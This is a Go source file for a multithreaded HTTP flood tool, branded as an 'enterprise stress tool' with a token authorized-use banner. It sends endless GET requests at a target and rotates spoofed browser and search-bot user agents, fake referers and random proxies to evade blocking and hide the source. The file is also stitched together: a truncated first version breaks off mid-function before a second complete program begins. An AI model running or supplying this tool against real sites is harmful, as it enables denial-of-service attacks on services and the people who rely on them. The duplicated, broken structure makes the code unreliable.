package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var ops uint64
var proxies []string
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edg/117.0.2045.43",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 12; SM-G990U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; U; Android 11; en-US; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-F936U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/20.0 Chrome/116.0.5845.96 Mobile Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
	"Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18",
	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
	"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
	"curl/7.88.1",
	"Wget/1.21.3 (linux-gnu)",
	"facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
	"Mozilla/5.0 (PlayStation 5 4.00) AppleWebKit/537.73 (KHTML, like Gecko)",
	"Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.12.8",
	"DoCoMo/2.0 SH902i(c100;TB;W24H12)",
	"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
}

var referers = []string{
	"https://www.google.com/",
	"https://www.bing.com/",
	"https://www.yahoo.com/",
	"https://www.facebook.com/",
	"https://twitter.com/",
	"https://www.instagram.com/",
	"https://www.reddit.com/",
}

func loadProxies(filename string) {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("Error loading proxies: %v\n", err)
		os.Exit(1)
package main

import (
	"bufio"
	"crypto/tls"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Metrics structure to hold atomic counters
type Metrics struct {
	Requests  uint64
	Success   uint64 // 2xx
	Redirects uint64 // 3xx
	ClientErr uint64 // 4xx
	ServerErr uint64 // 5xx
	NetErrors uint64 // Connection/Timeout errors
}

var metrics Metrics
var proxies []string
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
}

var referers = []string{
	"https://www.google.com/",
	"https://www.bing.com/",
	"https://www.facebook.com/",
	"https://twitter.com/",
}

func loadProxies(filename string) {
	file, err := os.Open(filename)
	if err != nil {
		fmt.Printf("Error loading proxies: %v\n", err)
		os.Exit(1)
	}
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			if !strings.HasPrefix(line, "http") && !strings.HasPrefix(line, "socks") {
				line = "http://" + line
			}
			proxies = append(proxies, line)
		}
	}
	fmt.Printf("[+] Loaded %d proxies from %s\n", len(proxies), filename)
}

func attack(target string, wg *sync.WaitGroup, stop <-chan struct{}) {
	defer wg.Done()

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		MaxIdleConns:        100,
		MaxIdleConnsPerHost: 100,
		IdleConnTimeout:     90 * time.Second,
		DisableCompression:  true,
		ForceAttemptHTTP2:   true,
	}

	if len(proxies) > 0 {
		transport.Proxy = func(req *http.Request) (*url.URL, error) {
			proxyStr := proxies[rand.Intn(len(proxies))]
			return url.Parse(proxyStr)
		}
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   10 * time.Second,
	}

	reqUrl := target
	if !strings.HasPrefix(target, "http") {
		reqUrl = "https://" + target
	}

	for {
		select {
		case <-stop:
			return
		default:
			// Continue attacking
		}

		req, err := http.NewRequest("GET", reqUrl, nil)
		if err != nil {
			continue
		}

		req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
		req.Header.Set("Referer", referers[rand.Intn(len(referers))])
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
		req.Header.Set("Connection", "keep-alive")
		req.Header.Set("Cache-Control", "no-cache")

		resp, err := client.Do(req)
		atomic.AddUint64(&metrics.Requests, 1)

		if err != nil {
			atomic.AddUint64(&metrics.NetErrors, 1)
			continue
		}

		// Categorize Status Code
		code := resp.StatusCode
		if code >= 200 && code < 300 {
			atomic.AddUint64(&metrics.Success, 1)
		} else if code >= 300 && code < 400 {
			atomic.AddUint64(&metrics.Redirects, 1)
		} else if code >= 400 && code < 500 {
			atomic.AddUint64(&metrics.ClientErr, 1)
		} else if code >= 500 {
			atomic.AddUint64(&metrics.ServerErr, 1)
		}

		io.Copy(ioutil.Discard, resp.Body)
		resp.Body.Close()
	}
}

func main() {
	targetPtr := flag.String("t", "example.com", "Target Host")
	threadsPtr := flag.Int("th", 100, "Number of Threads")
	proxyPtr := flag.String("proxy", "", "Path to proxy list file")
	durationPtr := flag.Duration("d", 0, "Duration of the test (e.g., 30s, 5m). 0 = infinite")
	flag.Parse()

	fmt.Println("\n=================================================")
	fmt.Println("       KILLER ORGANISATION - ENTERPRISE STRESS TOOL")
	fmt.Println("=================================================")
	fmt.Println(" WARNING: FOR EDUCATIONAL & AUTHORIZED USE ONLY")
	fmt.Println("=================================================")

	if *proxyPtr != "" {
		loadProxies(*proxyPtr)
	}

	fmt.Printf("[+] Launching Enterprise Attack on %s\n", *targetPtr)
	fmt.Printf("[+] Threads: %d\n", *threadsPtr)
	if *durationPtr > 0 {
		fmt.Printf("[+] Duration: %v\n", *durationPtr)
	} else {
		fmt.Println("[+] Duration: Infinite (Ctrl+C to stop)")
	}

	stopChan := make(chan struct{})
	var wg sync.WaitGroup

	for i := 0; i < *threadsPtr; i++ {
		wg.Add(1)
		go attack(*targetPtr, &wg, stopChan)
	}

	start := time.Now()
	
	// Monitor Loop
	go func() {
		for {
			select {
			case <-stopChan:
				return
			default:
				time.Sleep(1 * time.Second)
				reqs := atomic.LoadUint64(&metrics.Requests)
				succ := atomic.LoadUint64(&metrics.Success)
				fail := atomic.LoadUint64(&metrics.ServerErr)
				elapsed := time.Since(start).Seconds()
				
				fmt.Printf("\r[+] Requests: %d | RPS: %.0f | 2xx: %d | 5xx: %d", 
					reqs, float64(reqs)/elapsed, succ, fail)
			}
		}
	}()

	if *durationPtr > 0 {
		time.Sleep(*durationPtr)
		close(stopChan)
	} else {
		// Wait indefinitely if no duration is set
		select {}
	}

	wg.Wait()
	
	// Final Report
	elapsed := time.Since(start)
	fmt.Println("\n\n=================================================")
	fmt.Println("             TEST COMPLETION REPORT              ")
	fmt.Println("=================================================")
	fmt.Printf(" Target:          %s\n", *targetPtr)
	fmt.Printf(" Duration:        %v\n", elapsed)
	fmt.Printf(" Total Requests:  %d\n", metrics.Requests)
	fmt.Printf(" Avg RPS:         %.2f\n", float64(metrics.Requests)/elapsed.Seconds())
	fmt.Println("-------------------------------------------------")
	fmt.Printf(" [2xx] Success:   %d\n", metrics.Success)
	fmt.Printf(" [3xx] Redirects: %d\n", metrics.Redirects)
	fmt.Printf(" [4xx] Client Err:%d\n", metrics.ClientErr)
	fmt.Printf(" [5xx] Server Err:%d\n", metrics.ServerErr)
	fmt.Printf(" [Err] Net Errors:%d\n", metrics.NetErrors)
	fmt.Println("=================================================")
}